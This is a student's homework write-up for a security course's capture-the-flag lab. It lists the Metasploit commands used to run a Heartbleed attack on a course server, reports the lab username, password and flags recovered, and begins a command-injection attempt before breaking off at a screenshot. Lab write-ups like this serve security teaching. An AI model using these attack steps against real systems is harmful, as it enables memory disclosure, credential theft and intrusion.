<b>I pledge on my honor that I have not given or received any unauthorized assistance on this homework or assignment. -Jacob Elspas</b>

Homework #4

Part 1: I started off by opening a Bash Terminal and making a metasploit container using the following command 
``` nc 159.89.233.47 1337``` and then running ```msfconsole```.
The I ran ```search heartbleed``` to find the path for the heartbleed attack, and then selected it with ``` use auxiliary/scanner/ssl/openssl_heartbleed```.
Next, I set the parameters for the exploit and subsequently ran it with the following commands:
``` 
set RHOSTS 165.227.204.80
set VERBOSE true
exploit
```
This ran the exploit on the IP address 165.227.204.80, which is the IP address of the website www.briong.com. I found this by using a website where you give it a domain name and it returns it’s IP address: 

![](/img/briong-IP.PNG)

After the execution of heartbleed, I looked through the output that was returned and I found the flag, as well as a username and a password:

* username=mnthomp22
* password=pass1234
* flag=CMSC389R-{h3art_bl33d}

Lastly, I also found an easter egg in the same line : easteregg=V0FJVCBUSElTIElTTidUIEVOQ1JZUFRJT04/Pw0KQ01TQzM4OVIte2Jhc2U2NF9pc19zdGlsbF91c2VkX2Zvcl9jcnlwdDB9!

After receiving a hint from my instructor, I learned that it was encoded in Base 64. After using an online decrypter it decrypted to the following message: 

WAIT THIS ISN'T ENCRYPTION??
CMSC389R-{base64_is_still_used_for_crypt0}

I've included a screenshot of a subsegment the output that I received after doing the attack:
![](/img/bash-flag.PNG)
 - - -
Part 2: 

The second part of this project involved running command injection on the Briong server. This took a long time, because I thought that you had to use metasploit and was having lots of trouble finding a command injection exploit and then running it. However, after too much time spent on that fruitless endeavor, eventually I went to the Wikipedia page that was linked about command injection and found that you can add a semicolon and another command to an input, and the second command will run. 

So, I tried this. I ran `nc briong.com 45` to get into the server, and was greeted with this login screen: 
![](/img/homework4-ping.PNG)
